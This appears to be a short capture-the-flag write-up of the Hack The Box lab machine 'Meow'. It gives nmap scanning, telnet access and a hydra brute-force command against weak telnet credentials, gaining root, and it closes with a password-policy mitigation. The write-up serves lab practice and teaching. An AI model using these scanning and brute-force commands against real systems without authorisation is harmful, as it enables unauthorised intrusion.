    [ HTB ] - Meow

    less than 1 minute read

    On this page

    • 1. RECONNAISSANCE
      • Gather Victim Network Information
    • 2. Initial Access
      • External Remote Services - Telnet Service
    • 3. Credential Access
      • Brute Force
    • Mitigations

    Meow server offers telnet service, But it has Weak Credentials which easily let attacker log in, Now Let’s beggin

    1. RECONNAISSANCE

    Gather Victim Network Information

    nmap -sS -sV 10.129.124.27



    2. Initial Access

    External Remote Services - Telnet Service

    telnet 10.129.124.27

    Target telnet server asks me credentials, hmm.. Let’s Burte Force

    3. Credential Access

    Brute Force

    hydra is a tool which help us to run Brute Forcing.
    Not only hydra, but also ncrack, medusa, metasploit available

    hydra -L users.txt -P passwords.txt 10.129.124.27 telnet

    Now, Let’s log in above result 

    Meow login: root



    Done.

    Mitigations

    Make sure Password Policies are proper
    Refer to NIST guidelines when creating password policies.
